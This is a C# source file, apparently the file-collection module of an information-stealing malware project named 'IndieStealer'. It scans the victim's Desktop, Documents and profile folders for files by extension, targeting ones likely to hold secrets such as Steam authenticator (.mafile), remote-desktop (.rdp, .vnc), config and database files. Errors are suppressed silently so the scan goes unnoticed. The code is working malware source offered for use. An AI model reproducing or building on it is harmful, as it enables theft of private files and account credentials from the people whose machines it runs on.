using System.Collections.Generic;
using System.IO;
using System;
using System.Linq;

namespace IndieStealer.Collect.System
{
    class Desktop
    {
        public static List<string> Files = null;
        private static string[] extensions = new string[]
        {".txt",".log",".cs",".mafile", ".cfg",".config",".cpp",".py", ".java",".php",".db",".exe",".sqlite",".docx",".doc",".rdp",".vnc"};
        public static void Collect()
        {
            try
            {
                                DirectoryInfo info = new DirectoryInfo(Info.Desktop);
                DirectoryInfo info2 = new DirectoryInfo(Info.Documents);
                DirectoryInfo info3 = new DirectoryInfo(Info.Profile);
                
                List<FileInfo> allFiles = null;
                try
                {
                    FileInfo[] desktopFiles = info.GetFiles("*.*", SearchOption.AllDirectories);
                    FileInfo[] documentsFiles = info2.GetFiles("*.*", SearchOption.TopDirectoryOnly);
                    FileInfo[] profileFiles = info3.GetFiles("*.*", SearchOption.TopDirectoryOnly);
                    allFiles = desktopFiles.ToList();
                    allFiles.AddRange(documentsFiles);
                    allFiles.AddRange(profileFiles);
                }
                catch (Exception exception)
                {}
                if (allFiles == null || allFiles.Count < 1)
                    return;
                Files = new List<string>();
                foreach (var file in allFiles)
                {
                    if (file.Extension == "")
                        continue;
                    foreach (var extension in extensions)
                    {
                        if (file.Extension == extension && file.Length <= Convert.ToInt32(Program.RunData.Size) * 1024)
                        {
                            if (Files.Any(x => x.Contains(file.Name)))
                                continue;
                            Files.Add(file.FullName);
                        }
                    }
                }
                Files.RemoveAll(x => string.IsNullOrEmpty(x));
            }
            catch (Exception exception)
            { }
        }
    }
}
